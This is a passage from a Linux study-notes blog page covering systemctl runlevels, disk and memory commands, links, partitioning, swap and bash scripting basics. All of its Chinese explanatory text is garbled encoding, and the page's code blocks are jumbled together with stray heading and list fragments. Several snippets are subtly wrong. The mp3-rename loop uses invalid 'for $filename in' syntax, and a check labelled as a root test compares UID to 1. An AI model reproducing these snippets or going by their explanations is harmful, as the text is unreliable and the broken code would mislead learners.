<h2 id="systemctl"><a href="#systemctl" class="headerlink" title="systemctl"></a>systemctl</h2><p><img src="/2021/03/21/linux100%E8%AE%B2/10.png" alt="10"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">systemctl get-default		&#x2F;&#x2F;æŸ¥çœ‹å½“å‰çº§åˆ«</span><br><span class="line">systemctl set-default ã€çº§åˆ«ã€‘	&#x2F;&#x2F;è®¾ç½®é‡å¯ä¹‹åçš„çº§åˆ«</span><br><span class="line">ã€æŸ¥çœ‹å¯¹åº”çº§åˆ«ï¼š   cd &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system    ls -l runlevel*.target ã€‘</span><br><span class="line"></span><br><span class="line">0		å…³æœº</span><br><span class="line">1		å­—ç¬¦ç•Œé¢</span><br><span class="line">2-4		å¤šç”¨æˆ·æ¨¡å¼</span><br><span class="line">5		å›¾å½¢ç•Œé¢</span><br><span class="line">6		é‡å¯</span><br></pre></td></tr></table></figure>





<h2 id="SElinux"><a href="#SElinux" class="headerlink" title="SElinux"></a>SElinux</h2><p><img src="/2021/03/21/linux100%E8%AE%B2/11.png" alt="11"></p>
<h2 id="å†…å­˜ä¸ç£ç›˜ç®¡ç†"><a href="#å†…å­˜ä¸ç£ç›˜ç®¡ç†" class="headerlink" title="å†…å­˜ä¸ç£ç›˜ç®¡ç†"></a>å†…å­˜ä¸ç£ç›˜ç®¡ç†</h2><h3 id="æŸ¥çœ‹å†…å­˜"><a href="#æŸ¥çœ‹å†…å­˜" class="headerlink" title="æŸ¥çœ‹å†…å­˜"></a>æŸ¥çœ‹å†…å­˜</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">free</span><br><span class="line">free -m		&#x2F;&#x2F;ä»¥Mä¸ºå•ä½</span><br><span class="line"></span><br><span class="line">top</span><br></pre></td></tr></table></figure>



<h3 id="æŸ¥çœ‹ç£ç›˜"><a href="#æŸ¥çœ‹ç£ç›˜" class="headerlink" title="æŸ¥çœ‹ç£ç›˜"></a>æŸ¥çœ‹ç£ç›˜</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l	&#x2F;&#x2F;æŸ¥çœ‹ç£ç›˜ä¿¡æ¯</span><br><span class="line">parted -l	&#x2F;&#x2F;æŸ¥çœ‹ç£ç›˜ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">df -h		&#x2F;&#x2F;æŸ¥çœ‹ç£ç›˜æŒ‚è½½ç‚¹</span><br><span class="line">du ã€æ–‡ä»¶åã€‘	&#x2F;&#x2F;æŸ¥çœ‹æ–‡ä»¶çœŸå®å¤§å°ã€å³å»é™¤ç©ºæ´å¤§å°ã€‘</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>åˆ›å»ºå¸¦æœ‰ç©ºæ´çš„æ–‡ä»¶ï¼š</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if&#x3D;&#x2F;dev&#x2F;zeroã€è¾“å…¥æ–‡ä»¶ã€‘ bs&#x3D;4Mã€å¤åˆ¶çš„æ¯ä¸€å—çš„å¤§å°ã€‘ count&#x3D;10ã€ä¸€å…±å¤åˆ¶å‡ å—ã€‘ seek&#x3D;20ã€åˆ›å»ºå¸¦ç©ºæ´æ–‡ä»¶çš„å‚æ•°ï¼šè¾“å‡ºæ–‡ä»¶ä¸­è·³è¿‡20å—å¼€å§‹å¤åˆ¶ã€‘ of&#x3D;afileã€è¾“å‡ºæ–‡ä»¶ã€‘</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/21/linux100%E8%AE%B2/12.png" alt="12"></p>
</blockquote>
<h3 id="ièŠ‚ç‚¹"><a href="#ièŠ‚ç‚¹" class="headerlink" title="ièŠ‚ç‚¹"></a>ièŠ‚ç‚¹</h3><p>æ¯ä¸ªæ–‡ä»¶éƒ½æœ‰ä¸€ä¸ªièŠ‚ç‚¹ï¼Œå…·ä½“å¯ä»¥é€šè¿‡<code>ls -i</code>æŸ¥çœ‹ï¼Œæœ‰äº›æ“ä½œä¼šæ”¹å˜ièŠ‚ç‚¹çš„å€¼ã€vim file(åˆ›å»ºæ—¶ï¼Œä¼šäº§ç”Ÿ.file.swp)ã€‘ï¼Œæœ‰äº›ä¸ä¼šã€echo &gt; fileã€‘</p>
<h3 id="é“¾æ¥"><a href="#é“¾æ¥" class="headerlink" title="é“¾æ¥"></a>é“¾æ¥</h3><h4 id="ç¡¬é“¾æ¥"><a href="#ç¡¬é“¾æ¥" class="headerlink" title="ç¡¬é“¾æ¥"></a>ç¡¬é“¾æ¥</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln afileã€æœ¬æ¥å°±æœ‰çš„æ–‡ä»¶ã€‘ bfile			</span><br><span class="line">&#x2F;&#x2F;è¯¥æ“ä½œèƒ½å°†bfileæŒ‡å‘å’Œafileä¸€æ ·çš„ièŠ‚ç‚¹ï¼Œå¯¹bfileå’Œafileçš„æ“ä½œéƒ½ç›¸å½“äºå¯¹è¯¥ièŠ‚ç‚¹è¿›è¡Œæ“ä½œ</span><br></pre></td></tr></table></figure>

<p>ä¸å¯ä»¥è·¨æ–‡ä»¶ç³»ç»Ÿ</p>
<h4 id="è½¯é“¾æ¥"><a href="#è½¯é“¾æ¥" class="headerlink" title="è½¯é“¾æ¥"></a>è½¯é“¾æ¥</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s afile bfile		&#x2F;&#x2F;ièŠ‚ç‚¹ä¼šæ”¹å˜ï¼Œç›¸å½“äºåˆ›å»ºäº†ä¸€ä¸ªæ–°æ–‡ä»¶ã€bfile -&gt; afileã€‘</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥è·¨æ–‡ä»¶ç³»ç»Ÿ</p>
<h3 id="ç£ç›˜åˆ†åŒº"><a href="#ç£ç›˜åˆ†åŒº" class="headerlink" title="ç£ç›˜åˆ†åŒº"></a>ç£ç›˜åˆ†åŒº</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l			&#x2F;&#x2F;æŸ¥çœ‹åˆ†åŒº</span><br><span class="line">fdisk &#x2F;dev&#x2F;sdb		&#x2F;&#x2F;è¿›å…¥åˆ†åŒºå¸®åŠ©</span><br><span class="line">parted &#x2F;dev&#x2F;sdb		&#x2F;&#x2F;å¤§äº2Tçš„ç£ç›˜åˆ†åŒº</span><br><span class="line"></span><br><span class="line">mkfs.ext4 &#x2F;dev&#x2F;sdb1					&#x2F;&#x2F;æ ¼å¼åŒ–åˆ†åŒºsdb1ä¸ºext4æ ¼å¼</span><br><span class="line">mount &#x2F;dev&#x2F;sdb1 &#x2F;mnt&#x2F;sdb1			&#x2F;&#x2F;ä¸´æ—¶æŒ‚è½½</span><br><span class="line">mount								&#x2F;&#x2F;æŸ¥çœ‹ä¸´æ—¶æŒ‚è½½</span><br><span class="line"></span><br><span class="line">vim &#x2F;etc&#x2F;fstab   å†™å…¥ï¼š</span><br><span class="line">&#x2F;dev&#x2F;sdb1 &#x2F;mnt&#x2F;sdb1 ext4ã€åˆ†åŒºç±»å‹ã€‘ defaultsã€é»˜è®¤å¯è¯»å¯å†™ã€‘ 0 0</span><br></pre></td></tr></table></figure>





<h3 id="ç”¨æˆ·ç£ç›˜é…é¢"><a href="#ç”¨æˆ·ç£ç›˜é…é¢" class="headerlink" title="ç”¨æˆ·ç£ç›˜é…é¢"></a>ç”¨æˆ·ç£ç›˜é…é¢</h3><p><img src="/2021/03/21/linux100%E8%AE%B2/13.png" alt="13"></p>
<h3 id="äº¤æ¢åˆ†åŒº"><a href="#äº¤æ¢åˆ†åŒº" class="headerlink" title="äº¤æ¢åˆ†åŒº"></a>äº¤æ¢åˆ†åŒº</h3><p><img src="/2021/03/21/linux100%E8%AE%B2/14.png" alt="14"></p>
<p>æ–‡ä»¶ç›´æ¥swapåˆ†åŒºæ³•ï¼š</p>
<p>æ°¸ä¹…ä¿®æ”¹ï¼š<code>vim /etc/fstab</code>ï¼Œå†™å…¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;swapfileã€åˆ›å»ºçš„ç©ºæ–‡ä»¶ã€‘ swapã€æŒ‚è½½åˆ°swapäº¤æ¢åˆ†åŒºä¸Šã€‘ swapã€åˆ†åŒºç±»å‹ã€‘ defaultsã€é»˜è®¤å¯è¯»å¯å†™ã€‘ 0 0</span><br></pre></td></tr></table></figure>





<h3 id="RAID"><a href="#RAID" class="headerlink" title="RAID"></a>RAID</h3><p><img src="/2021/03/21/linux100%E8%AE%B2/15.png" alt="15"></p>
<h3 id="é€»è¾‘å·LVM"><a href="#é€»è¾‘å·LVM" class="headerlink" title="é€»è¾‘å·LVM"></a>é€»è¾‘å·LVM</h3><p>æœªå®Œå¾…ç»­</p>
<h3 id="æŸ¥çœ‹ç³»ç»Ÿç»¼åˆçŠ¶æ€"><a href="#æŸ¥çœ‹ç³»ç»Ÿç»¼åˆçŠ¶æ€" class="headerlink" title="æŸ¥çœ‹ç³»ç»Ÿç»¼åˆçŠ¶æ€"></a>æŸ¥çœ‹ç³»ç»Ÿç»¼åˆçŠ¶æ€</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sar -uã€æŸ¥çœ‹CPUçŠ¶æ€ã€‘ 1ã€æ¯1ç§’é‡‡æ ·1æ¬¡ã€‘ 10ã€ä¸€å…±é‡‡æ ·10æ¬¡1ã€‘</span><br><span class="line"></span><br><span class="line">iftop	&#x2F;&#x2F;æŸ¥çœ‹ç½‘ç»œçŠ¶æ€</span><br></pre></td></tr></table></figure>











<h2 id="shellç¼–ç¨‹"><a href="#shellç¼–ç¨‹" class="headerlink" title="shellç¼–ç¨‹"></a>shellç¼–ç¨‹</h2><p><img src="/2021/03/21/linux100%E8%AE%B2/16.png" alt="16"></p>
<p>æ ¼å¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">#è¯¥è„šæœ¬ä½œç”¨</span><br><span class="line"></span><br><span class="line">#å†…å®¹</span><br></pre></td></tr></table></figure>

<p>å†™å®ŒååŠ æ‰§è¡Œæƒé™</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod u+x file</span><br></pre></td></tr></table></figure>

<p>å‡ ç§æ‰§è¡Œæ–¹å¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash file.sh		&#x2F;&#x2F;ä¸è¦xæƒé™ï¼Œä¸æ”¹å˜å½“å‰ç›®å½•</span><br><span class="line">.&#x2F;file.sh			&#x2F;&#x2F;è¦xæƒé™ï¼Œä¸æ”¹å˜å½“å‰ç›®å½•</span><br><span class="line">source .&#x2F;file.sh	&#x2F;&#x2F;ä¸è¦xæƒé™,æ”¹å˜å½“å‰ç›®å½•</span><br><span class="line">. .&#x2F;file.sh			&#x2F;&#x2F;ä¸è¦xæƒé™,æ”¹å˜å½“å‰ç›®å½•</span><br></pre></td></tr></table></figure>





<h3 id="é‡å®šå‘"><a href="#é‡å®šå‘" class="headerlink" title="é‡å®šå‘"></a>é‡å®šå‘</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">read val &lt; 1.txt</span><br><span class="line">echo $val 				&#x2F;&#x2F;1.txtå†…å®¹</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;è¾“å‡ºé‡å®šå‘</span><br><span class="line">echo 12 &gt; 1.txt		&#x2F;&#x2F;åˆ é™¤åŸæ¥å†…å®¹ï¼Œæ”¹æˆ12</span><br><span class="line">echo 12 &gt;&gt; 1.txt	&#x2F;&#x2F;åœ¨1.txtåè¿½åŠ 12</span><br><span class="line">echo 12 2&gt; 1.txt	&#x2F;&#x2F;å¦‚æœæŠ¥é”™ï¼Œå°†æŠ¥é”™å†…å®¹å†™åˆ°1.txt</span><br><span class="line">echo 12 &amp;&gt; 1.txt	&#x2F;&#x2F;åŸºæœ¬ä¿¡æ¯å’ŒæŠ¥é”™ä¿¡æ¯éƒ½å†™å…¥åˆ°1.txt</span><br></pre></td></tr></table></figure>

<blockquote>
<h4 id="EOFç”¨æ³•ï¼š"><a href="#EOFç”¨æ³•ï¼š" class="headerlink" title="EOFç”¨æ³•ï¼š"></a>EOFç”¨æ³•ï¼š</h4><p>EOFä¸€èˆ¬ä¼šé…åˆcatèƒ½å¤Ÿå¤šè¡Œæ–‡æœ¬è¾“å‡º.<br>å…¶ç”¨æ³•å¦‚ä¸‹:<br>&lt;&lt;EOF     //å¼€å§‹<br>â€¦.<br>EOF      //ç»“æŸ</p>
<p>ä¸¾ä¾‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat &gt; 2.sh &lt;&lt;EOF</span><br><span class="line">hello</span><br><span class="line">123</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<p>ä½œç”¨æ˜¯å°†hello\n123å†™å…¥åˆ°2.sh</p>
</blockquote>
<h3 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h3><ol>
<li><p>èµ‹å€¼æ—¶ç­‰å·ä¸¤è¾¹ä¸èƒ½å‡ºç°ç©ºæ ¼</p>
</li>
<li><pre><code>å°†å‘½ä»¤ç»“æœèµ‹å€¼
letc=$(ls -l /etc)
æˆ–
letc=`ls -l /etc`
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3. å­—ç¬¦ä¸²èµ‹å€¼æ—¶å¸¦ç©ºæ ¼ç”¨å•å¼•å·æˆ–è€…åŒå¼•å·</span><br></pre></td></tr></table></figure>
str=&quot;hello world&quot;
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">4. å˜é‡å¼•ç”¨</span><br></pre></td></tr></table></figure>
echo ${val}
echo $val
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">5. åˆ é™¤å˜é‡èµ‹å€¼</span><br></pre></td></tr></table></figure>
unset val
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### ç¯å¢ƒå˜é‡</span><br></pre></td></tr></table></figure>
env            //æŸ¥çœ‹ç¯å¢ƒå˜é‡
</code></pre></li>
</ol>
<p>$USER        //æŸ¥çœ‹å½“å‰ç”¨æˆ·<br>$PATH        //æŸ¥çœ‹ç¯å¢ƒè·¯å¾„</p>
<p>$?            //ä¸Šä¸€æ¡å‘½ä»¤æ­£å¸¸æ‰§è¡Œæ˜¾ç¤º0ï¼ŒæŠ¥é”™æ˜¾ç¤º1<br>$$            //æ˜¾ç¤ºå½“å‰è¿›ç¨‹PID<br>$0            //æ˜¾ç¤ºå½“å‰è¿›ç¨‹åç§°<br>$1            //ç¬¬ä¸€ä¸ªå‚æ•°</p>
<p>$*/$@        //ä»£è¡¨æ‰€æœ‰ä½ç½®çš„å‚æ•°<br>$#            //ä»£è¡¨å‚æ•°çš„ä¸ªæ•°</p>
<p>pos=${1-_}        //å¦‚æœç¬¬ä¸€ä¸ªå‚æ•°æœ‰å€¼ï¼Œåˆ™å–å€¼ï¼›å¦‚æœä¸ºç©ºå€¼åˆ™å–ä¸‹åˆ’çº¿ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; æˆ‘ä»¬å¯ä»¥å¢åŠ ç¯å¢ƒè·¯å¾„</span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>PATH=$PATH:/root</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">è¿™æ ·åœ¨ä»»ä½•è·¯å¾„éƒ½å¯ä»¥æ‰§è¡Œ&#x2F;rootç›®å½•ä¸‹çš„1.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">**ç¯å¢ƒå˜é‡é…ç½®æ–‡ä»¶æ‰§è¡Œé¡ºåºï¼š**</span><br><span class="line"></span><br><span class="line">![17](linux100è®²&#x2F;17.png) </span><br></pre></td></tr></table></figure>
<p>source /etc/bashrc            //æ›´æ–°ç¯å¢ƒå˜é‡</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### æ•°ç»„</span><br><span class="line"></span><br><span class="line">![18](linux100è®²&#x2F;18.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### å¼•å·</span><br><span class="line"></span><br><span class="line">å•å¼•å·ã€å®Œå…¨å¼•ç”¨ã€‘ï¼šé‡Œé¢æ˜¯ä»€ä¹ˆå°±æ˜¾ç¤ºä»€ä¹ˆ</span><br><span class="line"></span><br><span class="line">åŒå¼•å·ã€ä¸å®Œå…¨å¼•ç”¨ã€‘ï¼šå¦‚æœé‡Œé¢æœ‰$å˜é‡ï¼Œä¼šæ˜¾ç¤ºå˜é‡çš„å€¼</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![19](linux100è®²&#x2F;19.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### è¿ç®—ç¬¦</span><br><span class="line"></span><br><span class="line">#### ç®—æ•°è¿ç®—ç¬¦</span><br></pre></td></tr></table></figure>
<p>expr 4 + 5            //exprä¸æ”¯æŒæµ®ç‚¹æ•°<br>n1=<code>expr 4 + 5</code>        //ç­‰å·ä¸¤è¾¹ä¸èƒ½æœ‰ç©ºæ ¼</p>
<p>let â€œå˜é‡å=å˜é‡å€¼â€<br>(( a=10 ))</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### æ‹¬å·</span><br><span class="line"></span><br><span class="line">![20](linux100è®²&#x2F;20.png)</span><br></pre></td></tr></table></figure>
<p>[ 5 -gt 4 ]<br>[[ 5 &gt; 4 ]]<br>//echo $?  å¯æµ‹è¯•ä¸Šè¿°è¡¨è¾¾å¼ä¸ºçœŸè¿˜æ˜¯ä¸ºæ€¥å‡</p>
<p>{}<br>echo {0..9}            è¾“å‡º0-9<br>cp -v filename{,.bak}<br>//ç›¸å½“äº<br>cp -v filename filename.bak</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### test</span><br></pre></td></tr></table></figure>
<p>åˆ¤æ–­/etc/passwdæ˜¯å¦ä¸ºæ–‡ä»¶<br>test -f /etc/passwd<br>[ -f /etc/passwd ]<br>//echo $? ä¸º0ä¸ºçœŸï¼Œä¸ºé0ä¸ºå‡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### if-elif-else</span><br></pre></td></tr></table></figure>
<p>if [[ 5 &gt; 4 ]] ; then<br>    echo â€œyesâ€<br>elif [ $UID = 1 ] ; then<br>    echo â€œrootâ€<br>else<br>    echo â€œnoâ€<br>fi</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### ifåµŒå¥—</span><br></pre></td></tr></table></figure>
<p>if [ $UID = 1 ] ; then<br>    echo â€œrootâ€<br>    if [ -x /tmp/1.sh ] ; then<br>        bash /tmp/1.sh<br>    fi<br>else<br>    echo â€œswitch rootâ€<br>fi</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### case</span><br></pre></td></tr></table></figure>
<p>case â€œ$1â€ in<br>    â€œstartâ€|â€STARTâ€)        //æ³¨æ„ï¼ï¼šâ€start|STARTâ€)ä¸å¯ä»¥ï¼ï¼ï¼ä¼šè¢«å½“æˆä¸€ä¸ªè¾“å…¥å‚æ•°<br>    echo $0 start<br>    ;;</p>
<pre><code>&quot;stop&quot;|&quot;STOP&quot;)
echo $0 stop
;;

*)
echo $0 error
;;</code></pre><p>esac</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### for</span><br><span class="line"></span><br><span class="line">#### shellé£æ ¼çš„for</span><br></pre></td></tr></table></figure>
<p>#å°†è¯¥ç›®å½•ä¸‹æ‰€æœ‰mp3æ–‡ä»¶æ”¹æˆmp4<br>for $filename in <code>ls *.mp3</code><br>    do<br>        mv $filename $(basename $filename .mp3).mp4<br>    done</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### Cè¯­è¨€é£æ ¼çš„for</span><br></pre></td></tr></table></figure>
<p>for (( i=0 ; i&lt;10 ; i++ ))<br>    do<br>        echo print $i<br>    done</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### while</span><br></pre></td></tr></table></figure>
<p>a=0<br>while [ $a -lt 10 ]<br>do<br>    echo $a<br>    ((a++))<br>done</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### whileæ­»å¾ªç¯</span><br></pre></td></tr></table></figure>
<p>while :<br>do<br>    echo forever<br>done</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### untilã€ä¸whileç›¸åã€‘</span><br></pre></td></tr></table></figure>
<p>a=0<br>until [ $a -gt 10 ]        //ä¸ºå‡æ—¶æ‰§è¡Œã€ç›´åˆ°a&gt;10æ‰ç»“æŸã€‘<br>do<br>    echo $a<br>    ((a++))<br>done</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### breakå’Œcontinue</span><br></pre></td></tr></table></figure>
<p>for i in {0..9}<br>do<br>    if [[ $i = 5 ]] ; then<br>        break/continue<br>    fi<br>    echo $i<br>done</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### å‚æ•°çš„å¤„ç†</span><br></pre></td></tr></table></figure>
<p>#forå¤„ç†ï¼š</p>
<p>for i in $*<br>do<br>    $i ####<br>done</p>
<p>#whileå¤„ç†</p>
<p>while [ $# -ge 1 ]<br>do<br>    $1 #####<br>shift                    //shiftä»£è¡¨æŠŠå‚æ•°å·¦ç§»,è¿™æ ·æ¯æ¬¡å¾ªç¯$1éƒ½ä»£è¡¨ä¸€ä¸ªä¸åŒçš„å‚æ•°<br>done</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&gt; shiftä»£è¡¨æŠŠå‚æ•°å·¦ç§»,è¿™æ ·æ¯æ¬¡å¾ªç¯$1éƒ½ä»£è¡¨ä¸€ä¸ªä¸åŒçš„å‚æ•°</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### è‡ªå®šä¹‰å‡½æ•°</span><br></pre></td></tr></table></figure>
<p>checkpid(){<br>    local i            //å£°æ˜å‡½æ•°å†…çš„å±€éƒ¨å˜é‡<br>    for i in $*; do<br>        [ -d â€œ/proc/$iâ€ ] &amp;&amp; return 0        //å¦‚æœ&amp;&amp;å‰æˆç«‹ï¼Œåˆ™æ‰§è¡Œ&amp;&amp;åå†…å®¹<br>    done<br>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## æ­£åˆ™è¡¨è¾¾å¼åŠæ–‡æœ¬æœç´¢</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span 